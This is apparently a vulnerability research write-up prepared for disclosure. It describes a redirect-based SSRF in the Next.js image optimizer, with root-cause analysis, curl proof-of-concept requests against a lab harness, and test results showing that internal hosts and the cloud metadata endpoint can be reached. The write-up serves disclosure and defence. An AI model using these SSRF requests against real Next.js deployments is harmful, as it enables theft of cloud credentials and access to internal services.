# 001 — Next.js Image Optimizer: Redirect-Based Blind SSRF via Unvalidated Redirect Targets

- **Status**: reproduced
- **Severity**: High (CVSS ~7.5 — network/low-complexity/no-auth/changed-scope)
- **Affected component & version**: next@15.3.3 (and likely all versions with `/_next/image` remote fetch)
- **Vuln class**: SSRF via open redirect / unvalidated redirect following

## Root cause (source level)

`fetchExternalImage()` in `dist/server/image-optimizer.js:647` calls `fetch(href)` with **default `redirect: 'follow'`**. The native Node.js fetch (undici) follows 301/302/307/308 redirects automatically. **Redirect target URLs are never re-validated** against `remotePatterns`.

The `matchRemotePattern()` allowlist check (`dist/shared/lib/match-remote-pattern.js:24`) only runs on the **initial URL** in `validateParams()` (`image-optimizer.js:408`). Once the initial URL passes the allowlist, any redirect destination is followed — including internal IPs, localhost, cloud metadata endpoints, etc.

**No private-IP DNS check exists** in this version. There is no `dangerouslyAllowLocalIP` config for the image optimizer, no DNS resolution guard, and no IP range blocking.

## Reproduction (against running instance) — REQUIRED

Lab: Docker harness with next@15.3.3 (baseline config: `remotePatterns` allows `10.99.0.10` only), attacker redirect server at `10.99.0.10:4444`, internal oracle at `10.99.0.100`.

1. Attacker server is in `remotePatterns` allowlist
2. Request `/_next/image` with URL pointing to attacker's redirect endpoint
3. Attacker server returns 302 → internal oracle

PoC:
```bash
# 302 redirect → internal image (returns optimized image from internal target)
curl 'http://localhost:13001/_next/image?url=http%3A%2F%2F10.99.0.10%3A4444%2Fredirect%3Fto%3Dhttp%3A%2F%2F10.99.0.100%2Fimage.png&w=64&q=75' -o /dev/null -w '%{http_code}\n'
# Returns: 200 (optimized image from internal oracle)

# 302 redirect → internal metadata endpoint (fetch happens, returns 400 because not an image)
curl 'http://localhost:13001/_next/image?url=http%3A%2F%2F10.99.0.10%3A4444%2Fredirect%3Fto%3Dhttp%3A%2F%2F10.99.0.100%2Fmetadata&w=64&q=75' -o /dev/null -w '%{http_code}\n'
# Returns: 400 (not a valid image) BUT oracle logs show the fetch happened

# 307/308 also work
curl 'http://localhost:13001/_next/image?url=http%3A%2F%2F10.99.0.10%3A4444%2Fredirect%3Fto%3Dhttp%3A%2F%2F10.99.0.100%2Fimage.png%26status%3D307&w=64&q=75'

# Multi-hop redirect chains work (up to ~19 hops before fetch limit)
curl 'http://localhost:13001/_next/image?url=http%3A%2F%2F10.99.0.10%3A4444%2Fredirect-chain%3Fhops%3D5%26final%3Dhttp%3A%2F%2F10.99.0.100%2Fimage.png&w=64&q=75'
```

## Observed impact

**6 confirmed SSRF hits** across redirect techniques — all with oracle request log proof:

| Test | Status | Oracle Hit | Timing |
|------|--------|-----------|--------|
| 302 redirect → oracle/image.png | 200 | YES | 12ms |
| 307 redirect → oracle/image.png | 200 | YES | 8ms |
| 308 redirect → oracle/image.png | 200 | YES | 7ms |
| 302 redirect → oracle/metadata | 400 | YES | 5ms |
| 2-hop chain → oracle/image.png | 200 | YES | 8ms |
| 5-hop chain → oracle/image.png | 200 | YES | 10ms |

Oracle log evidence (example):
```
GET /image.png from 10.99.0.6 at 2026-06-17T07:13:43.572Z
```

The `redirect-aws-metadata` test (302 → `169.254.169.254`) returned **504 after 7s timeout** — confirming the fetch was attempted but timed out (no metadata service in Docker). In a real AWS/GCP/Azure deployment, this would return live credentials.

**Impact in production:**
- Any Next.js app with a `remotePatterns` entry pointing to a domain the attacker controls (or that has an open redirect) is vulnerable
- Attacker can reach cloud metadata endpoints (169.254.169.254), internal services, localhost
- If the internal target returns valid image bytes, the response is returned to the attacker (full-read SSRF)
- If the internal target returns non-image content, the SSRF is blind (request is made but response not returned)

## CVE / Novelty check

**This behavior appears to be a known-but-unpatched design gap.** CVE-2024-34351 addressed SSRF via Host header manipulation in Server Actions, but the `/_next/image` redirect-following behavior has no assigned CVE. The image optimizer's `fetchExternalImage()` has never validated redirect targets.

Closest known CVEs:
- CVE-2024-34351: Host header SSRF in Server Actions (different code path)
- CVE-2025-59471: Memory DoS via unbuffered response (same function, different bug)
- CVE-2026-44578: WebSocket SSRF (different handler)

**Status: likely novel for the `/_next/image` endpoint specifically.** The redirect-following SSRF in the image optimizer appears to be an undisclosed vulnerability class in Next.js.

## Disclosure

- Reported: pending
- CVE / advisory: none yet
